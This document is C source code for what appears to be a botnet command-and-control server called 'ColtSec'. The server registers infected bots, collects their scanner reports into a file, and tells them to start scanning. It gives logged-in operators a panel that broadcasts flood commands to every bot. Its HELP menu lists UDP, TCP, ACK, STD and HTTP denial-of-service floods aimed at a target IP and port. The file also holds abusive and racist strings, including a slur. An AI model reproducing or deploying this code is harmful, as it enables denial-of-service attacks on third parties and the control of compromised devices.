/* Made By @lavazyt Touch This Shit Ill Fuck Your Mum*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define MAXFDS 1000000

struct account {
	char id[20];
	char password[20];
};
static struct account accounts[50];
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];

static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
	int total = 0, got =1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "STOP USING RELIVANT PORTS\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[31m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[1;32m~>   \x1b[1;31m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
                                        if(dup) 
                                        {
                                        	if(send(infd, "!* KILLDEM\n", 11, MSG_NOSIGNAL) == -1) {close(infd); continue; }
                                        	if(send(infd, "!* FUCKDUPES\n", 11, MSG_NOSIGNAL) == -1) {close(infd); continue; }
                                        	if(send(infd, "!* HATESKIDS\n", 11, MSG_NOSIGNAL) == -1) {close(infd); continue; }
                                        	if(send(infd, "!* VARITYSEC\n", 11, MSG_NOSIGNAL) == -1) {close(infd); continue; }
                                        	if(send(infd, "!* FUCKSKIDDIES\n", 11, MSG_NOSIGNAL) == -1) {close(infd); continue; }
                                            close(infd);
                                            continue;
                                        }
                                         s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
										send(infd, "!* PHONES ON\n", 11, MSG_NOSIGNAL);
										
                                }
                                continue;
                        }
                         else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) 
                                                {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } 
                                                        continue;
                                                }
                                                if(strstr(buf, "REPORT ") == buf) 
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7; 
                                                        fprintf(telFD, "%s\n", line); 
                                                        fflush(telFD);
                                                        TELFound++;
                                                        continue;
                                                }
                                                if(strstr(buf, "PROBING") == buf)
                                                {
                                                        char *line = strstr(buf, "PROBING");
                                                        scannerreport = 1;
                                                        continue;
                                                }
                                                if(strstr(buf, "REMOVING PROBE") == buf)
                                                {
                                                        char *line = strstr(buf, "REMOVING PROBE");
                                                        scannerreport = 0;
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        continue;
                                                }
 
                                                printf("buf: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; BigBoatz Docked: %d [+] Nibbas Online: %d %c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(3);
        }
}
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
void *telnetWorker(void *sock)
{
		char usernamez[80];
        int thefd = (int)sock;
		int find_line;
        managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);
    
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r"); 
        while(!feof(fp)) 
		{
				c=fgetc(fp);
				++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
		{
			fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
			++j;
        }

        if(send(thefd, "\x1b[31mNickname: \x1b[30m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        if(strcmp(nickstring, accounts[find_line].id) == 0){	
       	if(send(thefd, "\x1b[31m*        Oi Your User Name Is Right Skid       *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;	
        if(send(thefd, "\x1b[0m \x1b[30m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m @varitysec runs this shit skiddie now fuck off  \r\n", 44, MSG_NOSIGNAL) == -1) goto end;
		    sleep(5);
        goto end;
		fak:

        Title:
		pthread_create(&title, NULL, &titleWriter, sock);
		char ascii_banner_line1 [90000];
		char ascii_banner_line2 [90000];
		char ascii_banner_line3 [90000];
		char ascii_banner_line4 [90000];
		char ascii_banner_line5 [90000];
		char ascii_banner_line6 [90000];
		char ascii_banner_line7 [90000];
		char ascii_banner_line8 [90000];

/*
Blue = '\x1b[0;34m'
Brown = '\x1b[0;33m'
Cyan = '\x1b[0;36m' 
DarkGray = '\x1b[1;30m' 
Green = '\x1b[0;32m' 
LightBlue = '\x1b[1;34m' 
LightCyan = '\x1b[0;31m' 
LightGray = '\x1b[0;37m' 
LightGreen = '\x1b[0;31m' 
LightPurple = '\x1b[1;35m' 
LightRed = '\x1b[1;31m' 
Normal = '\x1b[0m' 
Purple = '\x1b[1;37mm' 
Red = '\x1b[0;31m' 
White = '\x1b[1;37mm' 
Yellow = '\x1b[1;33m
 ██████╗ ██████╗ ██╗  ████████╗███████╗███████╗ ██████╗
██╔════╝██╔═══██╗██║  ╚══██╔══╝██╔════╝██╔════╝██╔════╝
██║     ██║   ██║██║     ██║   ███████╗█████╗  ██║     
██║     ██║   ██║██║     ██║   ╚════██║██╔══╝  ██║     
╚██████╗╚██████╔╝███████╗██║   ███████║███████╗╚██████╗
 ╚═════╝ ╚═════╝ ╚══════╝╚═╝   ╚══════╝╚══════╝ ╚═════╝
                                                                                                                      
*/
                                 

		sprintf(ascii_banner_line1, "\x1b[0;31m ██████\x1b[0;36m╗\x1b[0;31m ██████\x1b[0;36m╗ \x1b[0;31m██\x1b[0;36m╗  \x1b[0;31m████████\x1b[0;36m╗\x1b[0;31m███████\x1b[0;36m╗\x1b[0;31m███████\x1b[0;36m╗\x1b[0;31m ██████\x1b[0;36m╗\r\n");
		sprintf(ascii_banner_line2, "\x1b[0;31m██\x1b[0;36m╔════╝\x1b[0;31m██\x1b[0;36m╔═══\x1b[0;31m██\x1b[0;36m╗\x1b[0;31m██\x1b[0;36m║  \x1b[0;36m╚══\x1b[0;31m██\x1b[0;36m╔══╝\x1b[0;31m██\x1b[0;36m╔════╝\x1b[0;31m██\x1b[0;36m╔════╝\x1b[0;31m██\x1b[0;36m╔════╝\r\n");
		sprintf(ascii_banner_line3, "\x1b[0;31m██\x1b[0;36m║     \x1b[0;31m██\x1b[0;36m║   \x1b[0;31m██\x1b[0;36m║\x1b[0;31m██\x1b[0;36m║     \x1b[0;31m██\x1b[0;36m║   \x1b[0;31m███████\x1b[0;36m╗\x1b[0;31m█████\x1b[0;36m╗  \x1b[0;31m██\x1b[0;36m║     \r\n");
		sprintf(ascii_banner_line4, "\x1b[0;31m██\x1b[0;36m║     \x1b[0;31m██\x1b[0;36m║   \x1b[0;31m██\x1b[0;36m║\x1b[0;31m██\x1b[0;36m║     \x1b[0;31m██\x1b[0;36m║   ╚════\x1b[0;31m██\x1b[0;36m║\x1b[0;31m██\x1b[0;36m╔══╝  \x1b[0;31m██\x1b[0;36m║     \r\n");
		sprintf(ascii_banner_line5, "\x1b[0;36m╚\x1b[0;31m██████\x1b[0;36m╗╚\x1b[0;31m██████\x1b[0;36m╔╝\x1b[0;31m███████\x1b[0;36m╗\x1b[0;31m██\x1b[0;36m║   \x1b[0;31m███████\x1b[0;36m║\x1b[0;31m███████\x1b[0;36m╗╚\x1b[0;31m██████\x1b[0;36m╗\r\n");
		sprintf(ascii_banner_line6, "\x1b[0;36m ╚═════╝ ╚═════╝ ╚══════╝╚═╝   ╚══════╝╚══════╝ ╚═════╝\r\n");
                sprintf(ascii_banner_line7, "\x1b[0;36m	[+] \x1b[31mWelcome %s To ColtSec\x1b[0;36m [+]\r\n", accounts[find_line].id, buf);
		sprintf(ascii_banner_line8, "\x1b[0;36m	 [+] \x1b[0;31mType HELP for your options \x1b[0;36m[+]\r\n");
		if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ascii_banner_line7 , strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line8 , strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		if(send(thefd, "\x1b[1;32mColt>     \x1b[1;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
		if(strstr(buf, "!* PHONES ON")) 
        {
          sprintf(botnet, "DEM PHONES DUPIN\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	    }
	    		if(strstr(buf, "cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(thefd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
				if(send(thefd, "\x1b[1;32m~>>     \x1b[1;31m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(thefd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;		
				while(1) {
				if(send(thefd, "\x1b[1;32m~>>     \x1b[1;31m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}    
	    if(strstr(buf, "!* PHONES OFF")) 
        {
          sprintf(botnet, "DEM PHONES STOPPED DUPPIN\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	    }  

	    if(strstr(buf, "CREDITS"))
		{  
		sprintf(botnet, "Credits To @lavazyt for being the coddings god)\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }

	    if(strstr(buf, "BOTS"))
		{  
		sprintf(botnet, "[#] BA Bumbuddys Connected: %d [-]  DUPS Connected: %d [#]\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* TCP"))
		{  
		sprintf(botnet, "Succesfully Sent A TCP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* UDP"))
		{  
		sprintf(botnet, "Succesfully Sent A UDP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* STD"))
		{  
		sprintf(botnet, "STD Flood Sent to Skid\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* HTTP"))
		{  
		sprintf(botnet, "Succesfully Sent A HTTP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "!* SCANNER ON"))
		{  
		sprintf(botnet, "DEM NIGGAS DUPPIN\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* SCANNER OFF"))
		{  
		sprintf(botnet, "DEM NIGGAS STOPPED DUPPIN\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char ddosline1  [80];
				char ddosline2  [80];
				char ddosline3  [80];
				char ddosline4  [80];
				char ddosline5  [80];
				char ddosline12  [80];

                sprintf(ddosline1, "\x1b[36m\x1b[36m !* UDP [IP] [PORT] [TIME] 32 6500 400 | UDP FLOOD\r\n");
                sprintf(ddosline2, "\x1b[36m\x1b[36m !* STD [IP] [PORT] [TIME] | STD FLOOD\r\n");
                sprintf(ddosline3, "\x1b[36m\x1b[36m !* TCP [IP] [PORT] [TIME] 32 all 6500 400| TCP FLOOD\r\n");
                sprintf(ddosline4, "\x1b[36m\x1b[36m !* TCP [IP] [PORT] [TIME] 32 ack 6500 400 | ACK FLOOD\r\n");
                sprintf(ddosline5, "\x1b[36m\x1b[36m !* HTTP |GHP| [IP] [PORT] / [TIME] 1024 | KILLS ALL ATTACKS\r\n");
                sprintf(ddosline12, "\x1b[36m\x1b[36m !* KILLATTK | KILLS ALL ATTACKS\r\n");;

				if(send(thefd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline2,  strlen(ddosline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline3,  strlen(ddosline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline4,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline5,  strlen(ddosline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline12,  strlen(ddosline12),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;32m~>>   \x1b[1;31m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
			}
		continue;
		}
		if(strstr(buf, "LOGOUT")) 
	    {  
 		  sprintf(botnet, "Was The Dupes Not Good Enough For You? %s Bye\r\n", accounts[find_line].id, buf);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  goto end;
		}
	    if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "LOLNOGTFO")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
     			trim(buf);
                if(send(thefd, "\x1b[1;32m~>>   \x1b[1;31m", 11, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("report.log", "a");
                fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;

}

void client_addr(struct sockaddr_in addr){
        printf("IP:%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "\nIP:%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

void *BotListener(int port) 
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {       printf("\x1b[1;32mVaritySec~ \x1b[1;35m ->  [\x1b[1;31mNigga G0D Joined THe Net] ");
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("IP.log", "a");
                fprintf(logFile, "IP:%d.%d.%d.%d\n", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                fclose(logFile);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); 
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		printf("\x1b[1;31m @varitysec Owns This Shit\n");
        telFD = fopen("bots.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]); 
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD); 
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN); 
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL); 
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1)
        {
                broadcast("PING", -1, "PURGE");
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
